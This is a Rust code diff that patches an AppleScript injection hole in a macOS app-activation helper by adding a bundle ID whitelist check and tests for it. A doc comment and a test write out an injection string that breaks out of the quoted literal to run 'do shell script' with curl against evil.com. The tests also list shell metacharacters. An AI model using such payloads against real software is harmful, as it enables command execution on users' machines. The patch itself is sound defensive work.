@@ -22,7 +22,15 @@ const FOCUS_WAIT: Duration = Duration::from_millis(100);
 pub const OCTOPUS_BUNDLE_ID: &str = "com.octopus.desktop";
 
 /// 把指定 bundle_id 的 app 激活到前台。
+///
+/// **bundle_id 白名单校验**（修复 #10）：bundle_id 必须匹配
+/// `^[A-Za-z0-9.\-]{1,256}$`——只允许字母/数字/`.`/`-`，长度 1-256。
+/// 防止任意字符注入 AppleScript（如 `x") & "do shell script \"curl evil.com\"" & ("`）。
+///
+/// 当前 activate_app 是 dead code（无生产调用），但未来 Actionbar 集成密码生成器
+/// 独立窗口等场景会用到——白名单作为防御性校验，启用前先就位。
 pub fn activate_app(bundle_id: &str) -> Result<()> {
+    validate_bundle_id(bundle_id)?;
     let script = format!(r#"tell application id "{}" to activate"#, bundle_id);
     let output = Command::new("osascript")
         .arg("-e")
@@ -124,6 +132,28 @@ fn verify_focused(expected_bundle_id: Option<&str>) -> Result<()> {
     Ok(())
 }
 
+/// 校验 bundle_id 格式合法——只允许字母/数字/`.`/`-`，长度 1-256。
+///
+/// 防御 AppleScript 字符串字面量注入：拼接 `tell application id "{bundle_id}"` 时，
+/// 若 bundle_id 含 `"` 或换行可注入任意 AppleScript 语句 → shell 执行。
+///
+/// 用 char-level 校验避免引入 regex crate 依赖（desktop crate 当前无 regex）。
+fn validate_bundle_id(bundle_id: &str) -> Result<()> {
+    if bundle_id.is_empty() || bundle_id.len() > 256 {
+        anyhow::bail!("bundle_id 长度非法（{}，需 1-256）", bundle_id.len());
+    }
+    for c in bundle_id.chars() {
+        if !c.is_ascii_alphanumeric() && c != '.' && c != '-' {
+            anyhow::bail!(
+                "bundle_id {:?} 含非法字符 {:?}（只允许 A-Za-z0-9.-）",
+                bundle_id,
+                c
+            );
+        }
+    }
+    Ok(())
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -145,5 +175,45 @@ mod tests {
         );
         // 顺带校验常量本身
         assert_eq!(OCTOPUS_BUNDLE_ID, "com.octopus.desktop");
+    }
+
+    /// 修复 #10：bundle_id 白名单——合法格式应通过。
+    #[test]
+    fn test_validate_bundle_id_accepts_legal() {
+        assert!(validate_bundle_id("com.apple.Safari").is_ok());
+        assert!(validate_bundle_id("com.google.Chrome").is_ok());
+        assert!(validate_bundle_id("org.mozilla.firefox").is_ok());
+        assert!(validate_bundle_id("com.microsoft.edgemac").is_ok());
+        assert!(validate_bundle_id("company.thebrowser.Browser").is_ok());
+        assert!(validate_bundle_id("a").is_ok()); // 单字符
+        assert!(validate_bundle_id("com.example-app.sub-module").is_ok()); // 含 -
+    }
+
+    /// 修复 #10：bundle_id 白名单——非法格式应拒绝（防 AppleScript 注入）。
+    #[test]
+    fn test_validate_bundle_id_rejects_injection_attempts() {
+        // 引号注入——拼接 AppleScript 字符串字面量时危险
+        assert!(
+            validate_bundle_id("x\") & \"do shell script \\\"curl evil.com\\\"").is_err(),
+            "双引号注入必须拒绝"
+        );
+        assert!(validate_bundle_id("has\"quote").is_err());
+        // 空串 / 过长
+        assert!(validate_bundle_id("").is_err());
+        assert!(validate_bundle_id(&"a".repeat(257)).is_err());
+        // 含空格 / 特殊字符
+        assert!(validate_bundle_id("has space").is_err());
+        assert!(validate_bundle_id("has;semicolon").is_err());
+        assert!(validate_bundle_id("has\nnewline").is_err());
+        assert!(validate_bundle_id("中文").is_err()); // 非 ASCII
+        assert!(validate_bundle_id("shell$injection").is_err());
+        // 各类 shell 元字符
+        for c in ['$', '`', '|', '&', ';', '(', ')', '<', '>', '*', '?', '\\', '\''] {
+            assert!(
+                validate_bundle_id(&format!("evil{}char", c)).is_err(),
+                "字符 {:?} 应被拒绝",
+                c
+            );
+        }
     }
 }
